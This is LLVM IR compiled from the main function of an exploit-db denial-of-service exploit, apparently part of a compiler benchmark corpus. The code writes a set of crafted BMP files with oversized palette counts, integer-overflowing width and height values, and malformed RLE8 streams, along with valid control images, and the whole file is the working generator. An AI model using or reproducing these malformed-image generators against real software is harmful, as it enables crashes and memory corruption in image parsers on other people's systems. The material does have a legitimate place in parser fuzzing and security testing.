; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_29816.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_29816.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [11 x i8] c"ok8bit.bmp\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"paletteof1.bmp\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"paletteof2.bmp\00", align 1
@.str.3 = private unnamed_addr constant [12 x i8] c"ok24bit.bmp\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"wh4intof.bmp\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"wh3intof.bmp\00", align 1
@.str.6 = private unnamed_addr constant [12 x i8] c"w4intof.bmp\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"w3intof.bmp\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"okRLE.bmp\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"rle8of1.bmp\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"rle8of2.bmp\00", align 1
@.str.11 = private unnamed_addr constant [12 x i8] c"rle8of3.bmp\00", align 1
@.str.12 = private unnamed_addr constant [12 x i8] c"rle8of4.bmp\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i64, align 8
  %5 = alloca i64, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %8 = call i64 @malloc(i32 4000000)
  %9 = inttoptr i64 %8 to i8*
  store i8* %9, i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = call i32 @memset(i8* %10, i32 0, i32 4000000)
  %12 = call i64 @malloc(i32 4000000)
  %13 = inttoptr i64 %12 to i8*
  store i8* %13, i8** %3, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @memset(i8* %14, i32 0, i32 4000000)
  %16 = load i8*, i8** %2, align 8
  %17 = load i8*, i8** %2, align 8
  %18 = call i32 @writebmp(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i32 16, i32 16, i32 8, i32 0, i8* %16, i32 256, i8* %17, i32 256)
  %19 = load i8*, i8** %2, align 8
  %20 = load i8*, i8** %2, align 8
  %21 = call i32 @writebmp(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0), i32 16, i32 16, i32 8, i32 0, i8* %19, i32 65535, i8* %20, i32 256)
  %22 = load i8*, i8** %2, align 8
  %23 = load i8*, i8** %2, align 8
  %24 = call i32 @writebmp(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i32 16, i32 16, i32 8, i32 0, i8* %22, i32 1000000, i8* %23, i32 256)
  %25 = load i8*, i8** %2, align 8
  %26 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.3, i64 0, i64 0), i32 16, i32 16, i32 24, i32 0, i8* null, i32 0, i8* %25, i32 1024)
  %27 = load i8*, i8** %2, align 8
  %28 = call i32 @writebmp(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0), i32 32769, i32 32768, i32 24, i32 0, i8* null, i32 0, i8* %27, i32 4000000)
  %29 = load i8*, i8** %2, align 8
  %30 = call i32 @writebmp(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0), i32 37838, i32 37838, i32 24, i32 0, i8* null, i32 0, i8* %29, i32 4000000)
  %31 = load i8*, i8** %2, align 8
  %32 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.6, i64 0, i64 0), i32 1073741825, i32 1, i32 24, i32 0, i8* null, i32 0, i8* %31, i32 4000000)
  %33 = load i8*, i8** %2, align 8
  %34 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0), i32 1431655767, i32 1, i32 24, i32 0, i8* null, i32 0, i8* %33, i32 4000000)
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 0
  store i8 16, i8* %36, align 1
  %37 = load i8*, i8** %3, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  store i8 0, i8* %38, align 1
  %39 = load i8*, i8** %2, align 8
  %40 = load i8*, i8** %3, align 8
  %41 = call i32 @writebmp(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i32 16, i32 1, i32 8, i32 1, i8* %39, i32 256, i8* %40, i32 2)
  store i64 0, i64* %4, align 8
  br label %42

42:                                               ; preds = %55, %0
  %43 = load i64, i64* %4, align 8
  %44 = icmp slt i64 %43, 500000
  br i1 %44, label %45, label %58

45:                                               ; preds = %42
  %46 = load i8*, i8** %3, align 8
  %47 = load i64, i64* %4, align 8
  %48 = mul nsw i64 %47, 2
  %49 = getelementptr inbounds i8, i8* %46, i64 %48
  store i8 -1, i8* %49, align 1
  %50 = load i8*, i8** %3, align 8
  %51 = load i64, i64* %4, align 8
  %52 = mul nsw i64 %51, 2
  %53 = add nsw i64 %52, 1
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  store i8 0, i8* %54, align 1
  br label %55

55:                                               ; preds = %45
  %56 = load i64, i64* %4, align 8
  %57 = add nsw i64 %56, 1
  store i64 %57, i64* %4, align 8
  br label %42

58:                                               ; preds = %42
  %59 = load i8*, i8** %2, align 8
  %60 = load i8*, i8** %3, align 8
  %61 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i32 16, i32 1, i32 8, i32 1, i8* %59, i32 256, i8* %60, i32 1000000)
  %62 = load i8*, i8** %3, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 0
  store i8 15, i8* %63, align 1
  %64 = load i8*, i8** %3, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 1
  store i8 0, i8* %65, align 1
  store i64 1, i64* %5, align 8
  br label %66

66:                                               ; preds = %79, %58
  %67 = load i64, i64* %5, align 8
  %68 = icmp slt i64 %67, 500000
  br i1 %68, label %69, label %82

69:                                               ; preds = %66
  %70 = load i8*, i8** %3, align 8
  %71 = load i64, i64* %5, align 8
  %72 = mul nsw i64 %71, 2
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  store i8 -1, i8* %73, align 1
  %74 = load i8*, i8** %3, align 8
  %75 = load i64, i64* %5, align 8
  %76 = mul nsw i64 %75, 2
  %77 = add nsw i64 %76, 1
  %78 = getelementptr inbounds i8, i8* %74, i64 %77
  store i8 0, i8* %78, align 1
  br label %79

79:                                               ; preds = %69
  %80 = load i64, i64* %5, align 8
  %81 = add nsw i64 %80, 1
  store i64 %81, i64* %5, align 8
  br label %66

82:                                               ; preds = %66
  %83 = load i8*, i8** %2, align 8
  %84 = load i8*, i8** %3, align 8
  %85 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0), i32 16, i32 1, i32 8, i32 1, i8* %83, i32 256, i8* %84, i32 1000000)
  %86 = load i8*, i8** %3, align 8
  %87 = call i32 @memset(i8* %86, i32 0, i32 4000000)
  %88 = load i8*, i8** %3, align 8
  %89 = getelementptr inbounds i8, i8* %88, i64 0
  store i8 0, i8* %89, align 1
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 1
  store i8 2, i8* %91, align 1
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i64 2
  store i8 -1, i8* %93, align 1
  %94 = load i8*, i8** %3, align 8
  %95 = getelementptr inbounds i8, i8* %94, i64 3
  store i8 0, i8* %95, align 1
  store i64 4, i64* %6, align 8
  br label %96

96:                                               ; preds = %99, %82
  %97 = load i64, i64* %6, align 8
  %98 = icmp slt i64 %97, 99999
  br i1 %98, label %99, label %109

99:                                               ; preds = %96
  %100 = load i8*, i8** %3, align 8
  %101 = load i64, i64* %6, align 8
  %102 = getelementptr inbounds i8, i8* %100, i64 %101
  store i8 0, i8* %102, align 1
  %103 = load i8*, i8** %3, align 8
  %104 = load i64, i64* %6, align 8
  %105 = add nsw i64 %104, 1
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  store i8 -2, i8* %106, align 1
  %107 = load i64, i64* %6, align 8
  %108 = add nsw i64 %107, 255
  store i64 %108, i64* %6, align 8
  br label %96

109:                                              ; preds = %96
  %110 = load i8*, i8** %2, align 8
  %111 = load i8*, i8** %3, align 8
  %112 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.11, i64 0, i64 0), i32 16, i32 1, i32 8, i32 1, i8* %110, i32 256, i8* %111, i32 1000000)
  %113 = load i8*, i8** %3, align 8
  %114 = call i32 @memset(i8* %113, i32 0, i32 4000000)
  store i64 0, i64* %7, align 8
  br label %115

115:                                              ; preds = %118, %109
  %116 = load i64, i64* %7, align 8
  %117 = icmp slt i64 %116, 99999
  br i1 %117, label %118, label %128

118:                                              ; preds = %115
  %119 = load i8*, i8** %3, align 8
  %120 = load i64, i64* %7, align 8
  %121 = getelementptr inbounds i8, i8* %119, i64 %120
  store i8 0, i8* %121, align 1
  %122 = load i8*, i8** %3, align 8
  %123 = load i64, i64* %7, align 8
  %124 = add nsw i64 %123, 1
  %125 = getelementptr inbounds i8, i8* %122, i64 %124
  store i8 -2, i8* %125, align 1
  %126 = load i64, i64* %7, align 8
  %127 = add nsw i64 %126, 255
  store i64 %127, i64* %7, align 8
  br label %115

128:                                              ; preds = %115
  %129 = load i8*, i8** %2, align 8
  %130 = load i8*, i8** %3, align 8
  %131 = call i32 @writebmp(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.12, i64 0, i64 0), i32 16, i32 1, i32 8, i32 1, i8* %129, i32 256, i8* %130, i32 1000000)
  %132 = load i32, i32* %1, align 4
  ret i32 %132
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @writebmp(i8*, i32, i32, i32, i32, i8*, i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
